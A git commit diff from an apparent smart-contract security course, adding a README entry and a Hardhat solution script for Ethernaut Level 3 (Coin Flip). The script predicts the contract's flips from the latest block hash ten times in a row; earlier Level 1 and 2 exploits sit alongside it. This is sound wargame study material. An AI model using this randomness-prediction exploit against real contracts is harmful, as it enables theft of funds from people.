5b9c449b623068ac2e37e430b7cd56d46ef8769e
Eskaine <eskaineliu@gmail.com>
2023-05-07 16:05:17 +0800

    chore: added ethernaut level 3 and solution

--- module-4/ethernaut/README.md
+++ module-4/ethernaut/README.md
@@ -10,4 +10,6 @@ You will beat this level if
 
 Claim ownership of the contract below to complete this level.
 
+## Level 3 - Coin Flip
 
+This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
--- module-4/ethernaut/scripts/solutions.js
+++ module-4/ethernaut/scripts/solutions.js
@@ -7,7 +7,7 @@ async function runLevel1() {
   const fallback = await Fallback.deploy();
   await fallback.deployed();
 
-  // Level 1 Solution
+  // Solution
   const value = ethers.utils.parseUnits("1", "gwei");
   await fallback.connect(user).contribute({value});
   await user.sendTransaction({to: fallback.address, value});
@@ -21,14 +21,36 @@ async function runLevel2() {
   const fallout = await Fallout.deploy();
   await fallout.deployed();
 
-  // Level 2 Solution
+  // Solution
   const value = ethers.utils.parseUnits("1", "gwei");
   await fallout.connect(user).Fal1out({value});
 }
 
+// Ethernaut Level 3
+async function runLevel3() {
+  const [, user] = await ethers.getSigners();
+  const CoinFlip = await hre.ethers.getContractFactory("CoinFlip");
+  const coinFlip = await CoinFlip.deploy();
+  await coinFlip.deployed();
+
+  // Solution
+  const totalRounds = 10;
+  const factor = Number("57896044618658097711785492504343953926634992332820282019728792003956564819968");
+  
+  for(let i = 0; i < totalRounds; i++) {
+    const  lastBlock = await hre.ethers.provider.getBlock("latest");
+    const flip = Math.floor(Number(lastBlock.hash)/factor);
+    const side = flip === 1;
+
+    await coinFlip.connect(user).flip(side);
+  }
+}
+
+
 async function main() {
-  runLevel1();
-  runLevel2();
+  // runLevel1();
+  // runLevel2(); 
+  runLevel3();
 }
 
 main().catch((error) => {
